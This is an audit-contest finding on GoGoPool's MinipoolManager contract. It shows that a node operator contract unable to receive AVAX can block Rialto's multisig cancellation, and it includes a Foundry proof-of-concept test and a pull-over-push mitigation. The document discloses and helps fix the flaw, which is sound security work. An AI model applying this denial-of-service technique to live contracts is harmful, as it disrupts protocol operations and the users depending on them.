## Tags

- bug
- 2 (Med Risk)
- primary issue
- selected for report
- sponsor confirmed
- fix security (sponsor)
- M-07

# [Rialto may not be able to cancel minipools created by contracts that cannot receive AVAX](https://github.com/code-423n4/2022-12-gogopool-findings/issues/623) 

# Lines of code

https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L664


# Vulnerability details

## Impact
A malicious node operator may create a minipool that cannot be cancelled. 
## Proof of Concept
Rialto may cancel a minipool by calling [cancelMinipoolByMultisig](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L520), however the function sends AVAX to the minipool owner, and the owner may block receiving of AVAX, causing the call to `cancelMinipoolByMultisig` to fail ([MinipoolManager.sol#L664](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L664)):
```solidity
function _cancelMinipoolAndReturnFunds(address nodeID, int256 index) private {
  ...
  address owner = getAddress(keccak256(abi.encodePacked("minipool.item", index, ".owner")));
  ...
  owner.safeTransferETH(avaxNodeOpAmt);
}
```

The following PoC demonstrates how calls to `cancelMinipoolByMultisig` can be blocked:
```solidity
function testCancelMinipoolByMultisigDOS_AUDIT() public {
  uint256 duration = 2 weeks;
  uint256 depositAmt = 1000 ether;
  uint256 avaxAssignmentRequest = 1000 ether;
  uint128 ggpStakeAmt = 200 ether;

  // Node operator is a contract than cannot receive AVAX:
  // contract NodeOpContract {}
  NodeOpContract nodeOpContract = new NodeOpContract();
  dealGGP(address(nodeOpContract), ggpStakeAmt);
  vm.deal(address(nodeOpContract), depositAmt);

  vm.startPrank(address(nodeOpContract));
  ggp.approve(address(staking), MAX_AMT);
  staking.stakeGGP(ggpStakeAmt);
  MinipoolManager.Minipool memory mp1 = createMinipool(depositAmt, avaxAssignmentRequest, duration);
  vm.stopPrank();

  bytes32 errorCode = "INVALID_NODEID";
  int256 minipoolIndex = minipoolMgr.getIndexOf(mp1.nodeID);
  store.setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".status")), uint256(MinipoolStatus.Prelaunch));

  // Rialto trices to cancel the minipool created by the node operator contract but the transaction reverts since
  // the node operator contract cannot receive AVAX.
  vm.prank(address(rialto));
  // FAIL: reverted with ETH_TRANSFER_FAILED
  minipoolMgr.cancelMinipoolByMultisig(mp1.nodeID, errorCode);
}
```

## Tools Used
Manual review
## Recommended Mitigation Steps
Consider using the [Pull over Push pattern](https://fravoll.github.io/solidity-patterns/pull_over_push.html) to return AVAX to owners of minipools that are canceled by Rialto.